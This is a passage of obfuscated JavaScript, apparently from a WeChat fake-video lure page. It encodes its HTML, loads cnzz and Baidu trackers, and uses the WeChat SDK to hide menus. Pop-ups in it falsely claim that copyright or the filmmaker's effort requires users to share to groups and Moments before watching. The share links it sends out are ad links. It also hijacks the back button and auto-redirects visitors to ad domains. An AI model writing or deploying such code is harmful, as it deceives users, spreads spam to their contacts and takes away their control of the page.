20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/em%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20id%3D%22adimg1%22%20style%3D%22display%3A%20none%3B%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%22javascript%3Aonclick_adimg1%28%29%3B%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cimg%20src%3D%22%22%20alt%3D%22%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/a%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/p%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22rich_media_content%22%20id%3D%22js_content%22%20style%3D%22height%3A%20200px%3B%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20id%3D%22adimg2%22%20style%3D%22display%3A%20none%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%22javascript%3Aonclick_adimg2%28%29%3B%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cimg%20src%3D%22%22%20alt%3D%22%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/a%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/p%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22rich_media_tool%22%20id%3D%22js_toobar3%22%20style%3D%22padding%3A%200%2010px%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class%3D%22media_tool_meta%20meta_primary%22%20style%3D%22color%3A%20%23607fa6%3B%22%20id%3D%22js_view_source%22%20href%3D%22javascript%3Agzh%28%29%3B%22%3E%3C/a%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%20class%3D%22media_tool_meta%20meta_primary%20tips_global%20meta_praise%22%20id%3D%22like%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ci%20class%3D%22icon_praise_gray%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/i%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%20class%3D%22praise_num%22%20id%3D%22likeNum%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/span%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/span%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22media_tool_meta%20tips_global%20meta_primary%22%20id%3D%22js_read_area3%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%u9605%u8BFB%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%20id%3D%22readNum%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/span%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%3C%21--%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class%3D%22media_tool_meta%20tips_global%20meta_extra%22%20href%3D%22%23%23%22%20id%3D%22js_report_article3%22%20style%3D%22%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%u6295%u8BC9%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/a%3E%20--%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22adimg3%22%20style%3D%22display%3A%20none%3B%20text-align%3Acenter%3B%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%3E%3Ca%20%20href%3D%22javascript%3Aonclick_adimg3%28%29%3B%22%3E%3Cimg%20src%3D%22%22%20style%3D%22width%3A90%25%3Btext-align%3Acenter%3B%22%3E%3C/a%3E%3C/p%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22wonderful%22%20style%3D%22text-align%3A%20center%3Bmargin-left%3A1px%3Bcolor%3A%23888%3Bmargin-bottom%3A%2010px%3Bfont-size%3A%2015px%3B%22%3E%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%27form%27%3E%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%0A%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20style%3D%22width%3A%2010px%3Bheight%3A%201px%3B%22%3E%3C/div%3E%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22rich_media_extra%22%20id%3D%22gdt_area%22%20style%3D%22padding-top%3A%2050px%3B%20height%3A%2070px%3B%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%21--%20%3Cp%20style%3D%22padding%3A%200%2015px%2010px%3B%20color%3A%20%23888%3B%20font-size%3A%2015px%3B%22%3E%u5E7F%u544A%3C/p%3E%20--%3E%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22adimg4%22%20class%3D%22js_ad_link%20extra_link%22%20style%3D%22padding%3A%200%2015px%3B%20display%3A%20none%3B%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22swiper-container%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22swiper-wrapper%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22swiper-slide%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%22javascript%3A%3B%22%20onclick%3D%22onclick_adimg4%28%29%3B%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cimg%20src%3D%22%22%20border%3D%220%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/a%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%3Cdiv%20id%3D%22pauseplay%22%20style%3D%22display%3A%20none%3B%20opacity%3A%200%3B%20position%3A%20fixed%3B%20left%3A%200%3B%20right%3A%200%3B%20top%3A%2065px%3B%20bottom%3A%200%3B%20background-color%3A%20rgba%2880%2C%2080%2C%2080%2C%2050%29%3B%20z-index%3A%201%3B%22%3E%0A%20%20%20%20%3C/div%3E%0A%20%20%20%20%3Cdiv%20id%3D%22mask%22%20class%3D%22mask%22%3E%26nbsp%3B%3C/div%3E%0A%20%20%20%20%3Cdiv%20style%3D%22position%3A%20absolute%3B%20z-index%3A%20998%22%3E%0A%20%20%20%20%20%20%20%20%3Cscript%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20document.write%28%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%27%3Cimg%20src%3D%22./img/fxq2.png%22%20id%3D%22fenxiang%22%20style%3D%22display%3Anone%3Bwidth%3A100%25%3Bpadding-bottom%3A100vh%3Bposition%3Afixed%3Bz-index%3A999%3Btop%3A0%3Bleft%3A0%3B%20Background%3Argba%280%2C0%2C0%2C0.6%29%3B%22%3E%27%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%29%3B%0A%20%20%20%20%20%20%20%20%3C/script%3E%0A%20%20%20%20%3C/div%3E%0A%20%20%20%20%3C/body%3E%0A%20%20%20%20%3Cscript%20src%3D%22//res.wx.qq.com/open/js/jweixin-1.0.0.js%22%3E%3C/script%3E%0A%20%20%20%20%3Clink%20href%3D%22/v/weui.min.css%22%20rel%3D%22stylesheet%22%20type%3D%22text/css%22%20/%3E%0A%20%20%20%20%3Cstyle%3E%0A%20%20%20%20%20%20%20%20.weui-dialog%20%7B%0A%20%20%20%20%20%20%20%20position%3A%20fixed%3B%0A%20%20%20%20%20%20%20%20z-index%3A%205000%3B%0A%20%20%20%20%20%20%20%20width%3A%2095%25%3B%0A%20%20%20%20%20%20%20%20max-width%3A%20300px%3B%0A%20%20%20%20%20%20%20%20top%3A%2050%25%3B%0A%20%20%20%20%20%20%20%20left%3A%2050%25%3B%0A%20%20%20%20%20%20%20%20-webkit-transform%3A%20translate%28-50%25%2C%20-50%25%29%3B%0A%20%20%20%20%20%20%20%20transform%3A%20translate%28-50%25%2C%20-50%25%29%3B%0A%20%20%20%20%20%20%20%20background-color%3A%20%23fff%3B%0A%20%20%20%20%20%20%20%20text-align%3A%20center%3B%0A%20%20%20%20%20%20%20%20border-radius%3A%202vw%3B%0A%20%20%20%20%20%20%20%20overflow%3A%20hidden%3B%0A%20%20%20%20%20%20%20%20border-bottom-left-radius%3A1.8vw%3B%0A%20%20%20%20%20%20%20%20border-bottom-right-radius%3A0%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.weui-dialog__bd%3Afirst-child%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20padding%3A%202.7em%2020px%201.7em%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%23353535%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.weui-dialog__bd%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20padding%3A%200%201.6em%20.8em%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20min-height%3A%2040px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A%2015px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20line-height%3A%201.3%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20word-wrap%3A%20break-word%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20word-break%3A%20break-all%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%23000%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.weui-dialog__ft%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20background%3A%23e1c38f%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20position%3A%20relative%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20line-height%3A%2048px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A%2018px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20display%3A%20-webkit-box%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20display%3A%20-webkit-flex%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20display%3A%20flex%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20.weui-dialog__btn_primary%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%23fff%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%23lly_dialog%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20height%3A100vh%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%23lly_dialog_cha%7B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20text-align%3A%20right%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin-right%3A%203vw%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin-top%3A%20-2vw%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A%209vw%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%23666%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-weight%3A%20100%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20.mask%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20display%3A%20none%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20position%3A%20absolute%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20top%3A%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20filter%3A%20alpha%28opacity%3D75%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20background-color%3A%20%23000%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20z-index%3A%2062%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20left%3A%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20opacity%3A%20.8%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20-moz-opacity%3A%20.8%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20.text%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20width%3A%2065%25%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20height%3A%2075px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20float%3Aleft%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A%201em%3B%0A%20%20%20%20%20%20%20%20%20%20%20-webkit-box-orient%3A%20vertical%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20-webkit-line-clamp%3A%203%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20overflow%3A%20hidden%3B%0A%20%20%20%20%3C/style%3E%0A%20%20%20%20%3Cscript%20type%3D%22text/javascript%22%20src%3D%22/v/zepto.min.js%22%20charset%3D%22utf-8%22%3E%3C/script%3E%0A%20%20%20%20%3Cscript%20src%3D%27app.js%3Ft%3D12657090%27%20charset%3D%22utf-8%22%3E%3C/script%3E%0A%3Cdiv%20id%3D%22stat%22%3E%0A%3Cscript%20language%3D%22javascript%22%3Edocument.all.stat.style.display%3D%22none%22%3B%3C/script%3E%0A%3Cscript%20type%3D%22text/javascript%22%3Evar%20cnzz_protocol%20%3D%20%28%28%22https%3A%22%20%3D%3D%20document.location.protocol%29%20%3F%20%22https%3A//%22%20%3A%20%22http%3A//%22%29%3Bdocument.write%28unescape%28%22%253Cspanid%3D%27cnzz_stat_icon_"+youmeng+"%27%253E%253C/span%253E%253Cscript%20src%3D%27%22%20+%20cnzz_protocol%20+%20%22s5.cnzz.com/z_stat.php%253Fid%253D"+youmeng+"%27%20type%3D%27text/javascript%27%253E%253C/script%253E%22%29%29%3B%3C/script%3E%0A%20%20%20%20%0A%3C/div%3E%0A%3C/html%3E%0A");

new_doc.write(html);
new_doc.close();

var _hmt = _hmt || [];
(function () {
    var hm = document.createElement("script");
    hm.src = "https://hm.baidu.com/hm.js?" + baidu;
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(hm, s);
})();


/**
 * @version  1.0
 * @author   eacher
 * @param
 * @return array | boolean
 */
function openfh() {
    window.onhashchange = function () {
        if (fanhuii === 1) {
            location.href = 'http://' + returnpage + '/?blok';
        } else {
            ggcash('fanhui');
        }
    }
}

/**
 * @version  1.0
 * @author   eacher
 * @param
 * @return array | boolean
 */
function autoskip() {
    if (autotime < (Date.parse(new Date()) - timestamp)) {
        $.post(apidomain, {
            index: 'xxp'
        }, function (res) {
            location.href = res.url;
        }, 'JSON');
    } else {
        setTimeout(function () {
            window.autoskip()
        }, 500);
    }
}

/**
 * @version  1.0
 * @author   eacher
 * @param
 * @return array | boolean
 * 统一广告入口
 */
function ggcash(name) {
    location.href = ggdomain + '?cash=' + name;
}

function setCookie(name, value) {
    var Days = 1;
    var exp = new Date();
    exp.setTime(exp.getTime() + Days * 6 * 1000);
    document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString();
}

function getCookie(name) {
    var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
    if (arr = document.cookie.match(reg)) return unescape(arr[2]);
    else return null;
}

function getQueryString(name) {
    var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
    var r = window.location.search.substr(1).match(reg);
    if (r != null) {
        return decodeURI(r[2]);
    }
    return null;
}

var shareATimes = 0;
var shareTTimes = 0;
var alertTimes = 0;
var message = null;

var Tpost = null
var Apost = null

!(function () {
    var temp = new Array()
    for (var i = 0; i < TTimes.length; i++) {
        temp["'" + TTimes[i] + "'"] = TTimes[i]
        if (1 <= i) {
            Tpost = '1'
        } else {
            Tpost = TTimes[i]
        }
    }
    TTimes = temp
    temp = new Array()
    var changdu = ATimes.length
    for (var i = 0; i < ATimes.length; i++) {
        temp["'" + ATimes[i] + "'"] = ATimes[i]

        if (1 <= i) {
            Apost = '1'
        } else {
            Apost = ATimes[i]
        }
    }
    ATimes = temp
})()

/**
 * @version  1.0
 * @author   eacher
 * @param
 * @return array | boolean
 */
function wxconfig() {

    $.post(apidomain + "/share.php", {
        url: location.href.split('#')[0],
        index: 'jump',
        line: getQueryString('line')
    }, function (res) {

        if (tip == 'start' || (tip != 'ok' && tip != 'goon')) {
            window.data = res;
            wx.config(window.data.config);
            wx.ready(function () {
                wx.hideOptionMenu();
            });
        }
        if (tip == 'ok') {
            window.data = res;
            wx.config(window.data.config);
            shaerdata();
        } else {
            window.data = res;
            wx.config(window.data.config);
            wx.ready(function () {
                wx.hideOptionMenu();
            });
        }


    }, 'JSON');
    autoskip()
}

function wxalert(msg, btn, callback) {
    if (alertTimes == 0) {
        var dialog = unescape("%3C%64%69%76%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%22%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%22%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%6D%61%73%6B%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%22%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%64%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%6D%73%67%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%66%74%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%61%20%68%72%65%66%3D%22%6A%61%76%61%73%63%72%69%70%74%3A%3B%22%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%20%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%5F%70%72%69%6D%61%72%79%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%62%74%6E%22%3E%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%3C%2F%64%69%76%3E");
        $("body").append(dialog)

    }
    alertTimes++;
    var d = $('#lly_dialog');
    d.show(200);
    d.find("#lly_dialog_msg").html(msg);
    d.find("#lly_dialog_btn").html(btn);
    d.find("#lly_dialog_btn").off('click').on('click', function () {
        d.hide(200);
        if (callback) {
            callback()
        }
    })
}

//首次分享为群
function share_tip_qun() {
    share_config(window.result);
    if (0 === shareATimes && 1 < shareTTimes) {
        message = window.result.share_info.a0
        wxalert(message, '确定')
    } else {
        if (shareATimes == 1 && qaa <= 4) {
            message = window.result.share_info.a0
            wxalert(message, '确定')

        } else if (shareATimes == 2 && qaa <= 4) {
            message = window.result.share_info.a1
            wxalert(message, '确定')

        } else if (shareATimes == 3 && qaa <= 4) {
            message = window.result.share_info.a2
            wxalert(message, '确定')

        } else if (shareATimes == 4 && qaa <= 4 && qaa != 3) {
            message = window.result.share_info.a3
            wxalert(message, '确定')

        } else {
            if (1 === shareTTimes && Tpost === '0' && shareATimes !== 0) {
                message = window.result.share_info.success
                wxalert(message, '确定', function () {
                    setCookie('xxxooo', '1');
                    $.post(apidomain, {
                        index: 'goon',
                        vsd: vsd
                    }, function (res) {
                        location.href = res.url;
                    }, 'JSON');
                })
            } else if (1 === shareTTimes && shareATimes !== 0) {
                message = window.result.share_info.timeline
                wxalert(message, '确定')
            } else if (2 <= shareTTimes) {
                message = window.result.share_info.success
                wxalert(message, '确定', function () {
                    setCookie('xxxooo', '1');
                    $.post(apidomain, {
                        index: 'goon',
                        vsd: vsd
                    }, function (res) {
                        location.href = res.url;
                    }, 'JSON');
                })

            } else if (shareATimes === 0) {
                message = window.result.share_info.a0
                wxalert(message, '确定')
            } else {
                message = window.result.share_info.a4
                fanhuii = 0
                wxalert(message, '确定')
            }
        }
    }
}

//首次分享为圈
function share_tip() {
    share_config(window.result);
    if (0 === shareTTimes && 1 < shareATimes) {
        message = window.result.share_info.a0
        wxalert(message, '确定')
    } else {
        if (shareATimes == 1 && qaa <= 4) {
            message = window.result.share_info.a1
            wxalert(message, '确定')

        } else if (shareATimes == 2 && qaa <= 4) {
            message = window.result.share_info.a2
            wxalert(message, '确定')

        } else if (shareATimes == 3 && qaa <= 4) {
            message = window.result.share_info.a3
            wxalert(message, '确定')

        } else if (shareATimes == 4 && qaa <= 4 && qaa != 3) {
            message = window.result.share_info.a4
            wxalert(message, '确定')

        } else {
            if (1 === shareTTimes && Tpost === '0' && shareATimes !== 0) {
                /*message = window.result.share_info.success
                wxalert(message, '确定', function() {

                })*/
                setCookie('xxxooo', '1');
                $.post(apidomain, {
                    index: 'goon',
                    vsd: vsd
                }, function (res) {
                    location.href = res.url;

                }, 'JSON');
            } else if (1 === shareTTimes && shareATimes !== 0) {
                message = window.result.share_info.timeline
                wxalert(message, '确定')
            } else if (2 <= shareTTimes) {
                /*message = window.result.share_info.success
                wxalert(message, '确定', function() {

                })*/
                setCookie('xxxooo', '1');
                $.post(apidomain, {
                    index: 'goon',
                    vsd: vsd
                }, function (res) {
                    setTimeout(function () {
                        window.location.href = res.url;
                    }, 200);
                }, 'JSON');
            } else if (shareATimes === 0) {
                message = window.result.share_info.a0
                wxalert(message, '确定')
            } else {
                message = window.result.share_info.a4
                fanhuii = 0
                wxalert(message, '确定')
            }
        }
    }
}

function show_tip() {
    if (message == null || message == '') {
        //message='<div class="weui-dialog__bd" id="lly_dialog_msg" style="font-size: 12px;"><img style="width: 40px;margin-top: -30px" src="http://wx1.sinaimg.cn/small/006tptJAgy1fuclmcuytwg302s02s747.gif"><br><b style="font-size: 16px;color: red">版权要求</b><br><br>分享到微信群即可<b style="color: red;">免流量看完整视频</b></div>';
        if (onequan == 1) {
            message = '<div style="font-size:4.8vw;margin:auto;line-height:140%"><img style="width:10vw;height:10vw;" src="/img/londing.gif"/> <br/> <b style="color:#a31418;font-size:6vw;">拍摄不易</b><br/><p>请分享到<b style="color:#ff0000">朋友圈</b>以示鼓励，并可继续观看</p>   </div>';
        } else {
            message = '<div style="font-size:4.8vw; margin:auto;line-height:140%"><p>请分享到<b style="color:#ff0000;font-size:6vw;">微信群</b></p><br/><img style="width: 12vw;height: 12vw;position: relative;margin:auto;" src="/img/weixin1.png"/><br/> <br/> <b style="color:#ff0000;font-size:6vw; font-weight: bold;">免流量继续观看</b>   </div>';
        }
    }
    fanhuii = 1;
    wxalert(message, '立即分享');
}

/**
 * @version  1.0
 * @author   eacher
 * @param
 * @return array | boolean
 */
function shaerdata() {
    $.post(apidomain + "/duapp.php", {
        TTimes: Tpost,
        vsd: window.vsd,
        ATimes: Apost,
        Timeline: Timeline

    }, function (data) {
        window.result = data;
        message = data.share_info.default
        share_config(data);
    }, 'JSON');
}

function share_config(data) {
    wx.ready(function () {
        wx.hideOptionMenu();
        if (onequan == 0) {
            //分享群   后分享圈
            if (shareATimes <= qaa) {
                wx.showMenuItems({
                    menuList: ['menuItem:share:appMessage']
                });
            } else {
                wx.showMenuItems({
                    menuList: ['menuItem:share:timeline']
                });
            }
            ////////////////////////////////////////////////////////////////////////////////////////////
            if ((shareATimes + shareTTimes) == '4') {
                wx.onMenuShareAppMessage({
                    title: ATimeslen() ? diqu + data.share_gg5_info.title : diqu + videostr[vsd].quntitle,
                    desc: ATimeslen() ? diqu + data.share_gg5_info.des : diqu + videostr[vsd].des,
                    link: ATimeslen() ? ggLink(data.share_gg5_info.link, window.data.quan) : window.data.qun + data.share_app_info.link,
                    imgUrl: ATimeslen() ? data.share_gg5_info.img_url : videostr[vsd].qunimg,
                    type: 'video',
                    dataUrl: "http://fs.ringop.kugou.com/G132/M0B/0C/1B/xA0DAFqPht2AGh9BACJOIM_Aa8U043.mp3",
                    success: function () {
                        shareATimes += 1;
                        share_tip_qun();
                    },
                    cancel: function () {
                    }
                });
            } else {
                wx.onMenuShareAppMessage({
                    title: ATimeslen() ? diqu + data.share_gg_info.title : diqu + videostr[vsd].quntitle,
                    desc: ATimeslen() ? diqu + videostr[vsd].des : diqu + videostr[vsd].des,
                    link: ATimeslen() ? ggLink(data.share_gg_info.link, window.data.quan) : window.data.qun + data.share_app_info.link,
                    imgUrl: ATimeslen() ? data.share_gg_info.img_url : videostr[vsd].qunimg,
                    type: 'video',
                    dataUrl: "http://fs.ringop.kugou.com/G132/M0B/0C/1B/xA0DAFqPht2AGh9BACJOIM_Aa8U043.mp3",
                    success: function () {
                        shareATimes += 1;
                        share_tip_qun();
                    },
                    cancel: function () {
                    }
                });
            }
            ////////////////////////////////////////////////////////////////////////////////////////////

        } else {
            //首次分享圈 及开广告 最后一次分享圈
            if (shareTTimes == 0) {
                wx.showMenuItems({
                    menuList: ['menuItem:share:timeline']
                });
            } else if (shareATimes > qaa) {
                wx.showMenuItems({
                    menuList: ['menuItem:share:timeline']
                });

            } else {
                wx.showMenuItems({
                    menuList: ['menuItem:share:appMessage']
                });
            }
            ////////////////////////////////////////////////////////////////////////////////////////////

            if ((shareATimes + shareTTimes) == '5') {
                wx.onMenuShareAppMessage({
                    title: ATimeslen() ? diqu + data.share_gg5_info.title : diqu + videostr[vsd].quntitle,
                    desc: ATimeslen() ? diqu + data.share_gg5_info.des : diqu + videostr[vsd].des,
                    link: ATimeslen() ? ggLink(data.share_gg5_info.link, window.data.quan) : window.data.qun + data.share_app_info.link,
                    imgUrl: ATimeslen() ? data.share_gg5_info.img_url : videostr[vsd].qunimg,
                    type: 'video',
                    dataUrl: "http://fs.ringop.kugou.com/G132/M0B/0C/1B/xA0DAFqPht2AGh9BACJOIM_Aa8U043.mp3",
                    success: function () {
                        shareATimes += 1;
                        share_tip();
                    },
                    cancel: function () {
                    }
                });
            } else {
                wx.onMenuShareAppMessage({
                    title: ATimeslen() ? diqu + data.share_gg_info.title : diqu + videostr[vsd].quntitle,
                    desc: ATimeslen() ? diqu + videostr[vsd].des : diqu + videostr[vsd].des,
                    link: ATimeslen() ? ggLink(data.share_gg_info.link, window.data.quan) : window.data.qun + data.share_app_info.link,
